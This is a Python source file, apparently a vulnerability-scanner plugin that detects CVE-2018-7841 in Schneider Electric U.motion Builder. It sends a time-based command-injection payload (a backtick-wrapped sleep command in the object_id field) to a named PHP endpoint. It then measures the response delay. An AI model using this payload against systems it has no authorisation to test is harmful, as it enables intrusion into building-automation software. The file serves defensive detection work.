"""Agent Asteroid implementation for CVE-2018-7841"""

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Schneider Electric U.motion Builder SQL Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2018-7841"
VULNERABILITY_DESCRIPTION = (
    "A SQL Injection (CWE-89) vulnerability exists in U.motion Builder software version "
    "1.3.4 which could cause unwanted code execution when an improper set of characters is entered."
)
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90
MAX_DELAY_DIFFERENCE = 5
DELAYS = [30, 40, 50, 60]
TARGET_ENDPOINT = "/smartdomuspad/modules/reporting/track_import_export.php"

REFERENCES = {
    "exploit-db.com": "https://www.exploit-db.com/exploits/46846",
    "rcesecurity.com": "https://www.rcesecurity.com/2019/05/cve-2018-7841-schneider-electric-umotion-builder-remote-code-execution-0-day/",
}


@exploits_registry.register
class CVE20187841Exploit(definitions.Exploit):
    """
    CVE-2018-7841: Schneider Electric U.motion Builder SQL Injection Vulnerability
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        has_public_exploit=True,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2018-7841"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        if resp.status_code == 200:
            return True
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        for delay in DELAYS:
            data = f"op=export&language=english&interval=1&object_id=`sleep {delay}`"
            try:
                resp = self.session.post(
                    target.origin + TARGET_ENDPOINT,
                    timeout=DEFAULT_TIMEOUT,
                    data=data,
                )
            except requests_exceptions.RequestException:
                return []
            elapsed = resp.elapsed.seconds
            if elapsed < delay or elapsed - delay > MAX_DELAY_DIFFERENCE:
                return []

        vulnerability = self.create_vulnerability(target)
        return [vulnerability]
